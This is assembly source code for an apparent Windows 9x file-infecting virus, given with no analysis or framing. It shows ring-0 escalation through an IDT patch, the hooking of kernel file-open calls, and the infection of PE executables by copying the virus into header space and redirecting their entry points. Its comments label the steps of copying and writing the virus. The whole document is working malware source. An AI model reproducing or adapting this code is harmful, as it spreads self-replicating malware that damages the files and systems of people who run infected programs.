   kernel_ord0             equ     0BFF713D4h
   kernel_int21            equ     0BFF712B9h

                           p386
                           model   flat

                           .data

                           dd      ?

                           .code
   start:

                           push    edi                     ; EDI <-- LDT.base
                           sidt    [esp-2]
                           pop     edi

                           fild    qword ptr [edi]         ; save desriptor #0

                           call    getr0procaddr          ; to get offset r0proc

   r0proc:                 fistp   qword ptr [edi-8]       ; restore descr. #0
                           ;;
                           mov     ebx, kernel_int21+8
   ;                       cmp     [ebx], 0C0000000h-(kernel_int21+8)
   ;                       jg      r0exit
      cmp byte ptr [ebx], (kernel_ord0-(kernel_int21+8+4)) and 255 ; alredy?
                           jne     r0exit

                           fild    qword ptr [vc1-start+esi];save VxDcall's code

                           push    virtsize                ; size of memory
   vc1:                    db      0CDh,20h                ; VxDcall
                           dd      0040000Dh               ; IFSMGR_GetHeap
                           pop     ecx                     ; ECX=virtsize

                           fistp   qword ptr [vc1-start+esi];rest.VxDcall's code

                           xchg    edi, eax                ; EDI = new location
                           rep     movsb                   ; copy virus

                           sub     edi, virtend-hook+4     ; EDI=(offset hook)-4
                           sub     edi, ebx                ;
                           mov     [ebx], edi             ; set new addr to call
                           ;;
   r0exit:                 iret                            ; back to ring3

   getr0procaddr:          pop     eax                     ; EAX = offset r0proc
                           stosd                           ; +0 WORD offs&0xFFFF
                           stosd                           ; +6 WORD offs>>16
                           mov     [edi-8+2], 0EE000028h   ; +2 DWORD sel./flags

                           xchg    esi, eax                ; ESI = offset r0proc
                           sub     esi, r0proc-start       ; ESI = offset start

                           int     00h                     ; call ring-0

                           db      68h                     ; return to host
   oldeip                  dd      $+4                    ; 1stime points to ret
                           ret

   ; HARDCODED: (hook-read)=12, so, size of the following subroutine is 12 bytes

   read:                   xor     ecx, ecx                ; ECX = bufsize
                           mov     ch, bufsize/256

                           lea     edx, [esi+ecx]          ; EDX = offset buf

                           mov     ah, 3Fh                 ; read buffer
                           jmp     ebp                     ; call ebp/ret

                           db      'Z'                     ; copyright ;-)

   hook:                   push    kernel_ord0             ; return address

                           cmp     ax, 716Ch               ; hook it
                           jne     hookexit                ;

   infect:                 pusha                           ; save regs

                           mov     bx, 2042h               ; noINT24/denynone/RW
                           xor     edx, edx                ;
                           push    edx                     ; ECX = 0
                           inc     edx                     ; EDX = 1
                           push    eax                     ; EAX = 716C
                           push    002A0010h            ; VWIN32_ResetWin32Event
                           call    dword ptr [esp+4+4+4+32]; call kernel_ord0
                           jc      infect_exit
                           xchg    ebx, eax                ; EBX = file handle

                           mov     ebp, kernel_int21       ; EBP = kernel_int21

   ;                       mov     esi, [ebp+8]
   ;                       add     esi, ebp
   ;                       sub     esi, hook-start-8-4
   ;                       lea     edi, read-start[esi]
                           mov     edi, [ebp+8]            ; EDI=offset read
                           add     edi, ebp
                           lea     esi, [edi-(hook-start-8-4)] ;ESI=offset start

                           call    edi                     ; call read

                           push    edx                     ; EDX = offset buf

                           mov     ah, 42h                 ; al=0
                           mov     edx, [edx+3Ch]          ; EDX=new exe ptr
                           xor     ecx, ecx                ; ECX=0
                           pusha
                           call    ebp                     ; int21/seek

                           call    edi                     ; call read
                           cmp     eax, ecx                ; full buffer read?

                           popa
                           pop     edi                     ; EDI = offset buf
                           jne     infect_close
                           call    ebp                     ; int21/seek

                           mov     edx, edi                ; EDX = offset buf

                           cmp     word ptr [edx], '0Z'    ; 'EP' when infected
                           jne     infect_close

                           mov     ecx, [edx+54h]          ; pe_headersize
                           add     edi, ecx            ; EDI=our location in buf

                           add     cx, ax                  ; ECX += mz.pe_ptr
                           xchg    ecx, [edx+28h]       ; ECX <--> entrypointrva
                           add     ecx, [edx+34h]          ; imagebase
                           mov     oldeip-start[esi], ecx ; store old entrypoint

                           xor     ecx, ecx                ; ECX = physsize
                           mov     cl, physsize
                           add     [edx+54h], ecx    ; pe_headersize += our.size

                           cld                             ; i think we need it

                           xor     eax, eax             ; check our new location
                           pusha                           ; should be zeroes
                           repz    scasb
                           popa
                           jne     infect_close

                           rep     movsb                   ; copy virus to buf

                           mov     ah, 40h                 ; write virus
                           mov     ch, bufsize/256         ; ECX = bufsize
                           call    ebp                     ; int21

   infect_close:           mov     ah, 3Eh                 ; close file
                           call    ebp                     ; int21

   infect_exit:            popa                            ; restore regs

   hookexit:               ret                             ; return to krnl_ord0

   physend:
   physsize                equ     $-start

                           org     start+bufsize          ; offset buf==size buf
   bufsize                 equ     4096
   buf                     db      bufsize dup (0)

   virtend:
   virtsize                equ     $-start

                           db      13,10
                           db      '------------------------',13,10

                           db      'physsize = '
                           db      physsize/1000 mod 10+'0'
                           db      physsize/ 100 mod 10+'0'
                           db      physsize/  10 mod 10+'0'
                           db      physsize/   1 mod 10+'0'
                           db      ' bytes',13,10
                           db      'virtsize = '
                           db      virtsize/1000 mod 10+'0'
                           db      virtsize/ 100 mod 10+'0'
                           db      virtsize/  10 mod 10+'0'
                           db      virtsize/   1 mod 10+'0'
                           db      ' bytes',13,10

                           db      '------------------------',13,10
                           db      13,10

                           end     start
